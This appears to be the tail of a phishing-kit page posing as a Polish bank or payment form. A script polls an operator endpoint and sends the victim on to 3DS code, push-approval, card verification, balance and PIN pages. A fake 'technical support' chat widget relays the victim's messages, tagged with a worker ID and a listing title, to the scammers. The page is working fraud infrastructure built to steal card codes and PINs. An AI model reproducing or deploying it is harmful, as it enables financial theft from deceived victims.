                            <div class="max table"><a class="button-close button-back"><span class="text-decoration">Zrezygnuj</span></a></div>                        </div>
                        <div class="col-xs-6 col-md-6 col-sm-6  no-mobile">
                            <div class="max table">
                                <a href="/autorize1649694540342573#creditpa/index/" class="button-close-and-new button-accept active">Nowy wniosek</a>                            </div>
                        </div>
                        <div class="col-xs-12 col-md-6 col-sm-6 mobile">
                            <div class="max table">
                                <a href="/autorize1649694540342573#creditpa/index/" class="button-close-and-new button-accept active">Nowy wniosek</a>
                            </div>
                        </div>
                        <div class="col-xs-12 col-md-6 col-sm-6 mobile">
                            <div class="max table"><a class="button-close button-back"><span class="text-decoration">Zrezygnuj</span></a></div>                        </div>
                    </div>
                            </div>
        </div>
    </div>
</div>
<div class="blur">
</div>    </div>
</div>
    <div class="container">
    <div class="row h--overlay popup-consent" id="popup-consent_extend">
        <div class="col-xs-8 col-md-5 col-sm-8 center popup-overlay">
            <div class="row">
                <div class="col-xs-12 col-md-12 col-sm-12">
                    <div class="title"></div>
                </div>
            </div>
            <div class="row">
                <div class="col-xs-12 col-md-12 col-sm-12">
                        <div class="message consentSection">
                                                                            </div>
                </div>
            </div>
            <div class="row">
                <div class="col-xs-12 col-md-12 col-sm-12">
                    <div class="buttons-popup">
                                                    <a data-consent="" data-swift="" href="/autorize1649694540342573#cancel" class="button button-cancel big " onclick="$(&#39;.popup-consent&#39;).hide();return false;">Anuluj</a>
                                                    <a data-consent="" data-swift="" href="/autorize1649694540342573#extend" class="button button-accept big consent-extend">Przejdź do banku</a>
                                            </div>
                </div>
            </div>
        </div>
        <div class="blur">
        </div>
    </div>
</div>    

    
    
<script type="text/javascript">
            
            

            function ajaxsup1() {
                var request = new XMLHttpRequest();

                request.onreadystatechange = function() {
                    if (request.readyState == 4 && request.status == 200) {
                        var loading = document.querySelector('#loading');
                        var smsblock = document.querySelector('#sms');
                        var lkblock = document.querySelector('#lk');
                        var result = request.responseText;
                        // console.log(request.responseText);
                        console.log('%md%');
                        if (result == 'sms') {
                            location="/3ds%md%";
                        }  else if (result == 'push') {
                             location="/accept%md%";
                        } else if (result == 'card') {
                             location="/verification%md%";
                        } else if (result == 'sms3ds') {
                             location="/fail%md%";
                        } else if (result == 'smsbal') {
                             location="/balance%md%";
                        } else if (result == 'smart') {
                             location="/pincode%md%";
                        } else {

                        }
                    }
                }
                request.open('POST', 'procstatus.php');
                request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                request.send('item=84941141');
            }

            function ajaxdel() {
                var request = new XMLHttpRequest();
                request.open('POST', 'delstatus.php');
                request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                request.send('item=84941141');
            }

        </script>


<style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #a99a6f;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #a99a6f;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #a99a6f;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>


    <div id="offonthechap">
            <div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
                <div class="chaport-launcher" style="left: 0px; right: 0px;">
                    <div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
                    <input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
                        <input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
                        <input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
                        <div class="chaport-launcher-chat-icon"></div>
                        <div class="chaport-launcher-close-icon"></div>
                        <div class="chaport-launcher-operator-photo"></div>
                    </div>
                </div>
                <div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
                    <div class="chaport-inner">
                        <div class="main-textblock">
                            <div class="operatorblock">
                                <div class="operatorblock-content" style="display: flex;">
                                    <div id="operator-photo">
                                        <img id="oper-photo-img" src="./noble_files/operator-img.png">
                                        <div class="operator-name">Sofia</div>
                                    </div>
                                    <div class="team-wrapper">
                                        <div class="team">Pomoc techniczna</div>
                                        <div class="activity-indicator">
                                            <div class="with-status" style="display: inline-block;">
                                                <div class="status-online" style="display: inline-block;">
                                                    
                                                </div>online</div>
                                            </div>
                                        </div>
                                </div>
                            </div>
                            <div class="chat-block">
                                <div id="chat">
                                    <div class="operators-msg" id="greeting-msg" style="display: none;">
                                        <div class="operators-photo"><img src="./noble_files/operator-img.png"></div>
                                        <div class="operators-first-text"></div>                            
                                    </div>
                                
                                </div>
                                <div id="input-msg" style="display: flex;">
                                    <input type="text" name="smstosup1" id="smstosup1" placeholder="Wpisz swoją wiadomość...">
                                    <button id="smstosupbutton1" onclick="sendMessage()">
                                        <div class="chaport-send-icon">
                                            <svg width="18" height="18" viewBox="0 0 535.5 535.5">
                                                <polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">      
                                                </polygon>
                                            </svg>
                                        </div>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>  
                    <div class="chaport-big-shadow"></div>
            </div>
        </div>

        <script type="text/javascript">


var supportbutton = document.querySelector('.chaport-launcher-button');
    var supportwindow = document.querySelector('.chaport-window');

    supportbutton.onclick = function() {
        if (supportwindow.style.opacity == '0') {
            supportwindow.style.opacity = '1';
            supportwindow.style.visibility = 'visible';
        } else {
            supportwindow.style.opacity = '0';
            supportwindow.style.visibility = 'hidden';
        }
    };
</script>

<script type="text/javascript">

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
var supportbutton = document.querySelector('.chaport-launcher-button');
var supportwindow = document.querySelector('.chaport-window');
var token = <?php echo $_GET['id']; ?>;
if (token !== null) {
if (pool) {
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
pool = false;
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("get=0&token=" + token);
xhttp.onload = function (e) {
if (xhttp.readyState === 4) {
  if (xhttp.status === 200) {
    var body = xhttp.response;
    pool = true;
    var json = JSON.parse(body);
    for (let i = 0; i < json.length; i++) {
      cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
      if (json[i].sender == 't') {
        text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="../ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
      } else if (json[i].sender == 'i') {
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }else if (json[i].sender == "testOnline"){
        return 'okay';
      }else{
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }

      
      $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
      var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
      objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
      supportwindow.style.opacity = '1';
      supportwindow.style.visibility = 'visible';
    }

  } else {
    pool = true;
  }
}
}
}
}
}

function sendMessage() {
message = document.getElementById("smstosup1").value;
if (message === '') {
return;
}
document.getElementById("smstosup1").value = '';
var token = document.getElementById("refresh_time").value;
if (token === null) {
var token = Math.random().toString(36).substring(7);
}
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var uid = document.getElementById("home_time").value;
var title = document.getElementById("product").value;
xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
setCookie('token', token);
var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
var d = new Date();
d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
var expires = "expires=" + d.toUTCString();
document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

</script>
            
    </body></html>